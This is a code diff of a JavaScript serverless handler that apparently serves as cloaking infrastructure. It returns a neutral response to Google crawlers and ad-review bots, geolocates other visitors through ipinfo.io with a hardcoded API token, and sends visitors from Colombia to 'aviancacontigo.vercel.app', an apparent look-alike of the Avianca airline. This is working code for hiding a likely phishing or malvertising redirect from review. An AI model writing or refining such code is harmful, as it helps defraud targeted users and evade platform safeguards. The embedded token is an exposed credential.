@@ -1,28 +1,23 @@
 export default async function handler(req, res) {
   const userAgent = req.headers['user-agent'] || '';
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+  const token = '3798a6699b4912';
 
-  // Detecta bots de Google
-  const isGoogleBot = /googlebot|adsbot-google/i.test(userAgent);
-  if (isGoogleBot) {
-    return res.status(204).end(); // No redirige
+  const esBotGoogle = /googlebot|adsbot-google/i.test(userAgent);
+  if (esBotGoogle) {
+    return res.status(200).json({ redirect: false });
   }
 
-  // Consulta a ipinfo.io
   try {
-    const ipinfoToken = '3798a6699b4912';
-    const response = await fetch(`https://ipinfo.io/${ip}/json?token=${ipinfoToken}`);
+    const response = await fetch(`https://ipinfo.io/${ip}/json?token=${token}`);
     const data = await response.json();
 
     if (data.country === 'CO') {
-      return res.writeHead(302, {
-        Location: 'https://aviancacontigo.vercel.app'
-      }).end();
+      return res.status(200).json({ redirect: true, url: 'https://aviancacontigo.vercel.app' });
     }
   } catch (err) {
-    // Si algo falla, no redirige
     console.error(err);
   }
 
-  return res.status(204).end(); // No redirige
+  return res.status(200).json({ redirect: false });
 }
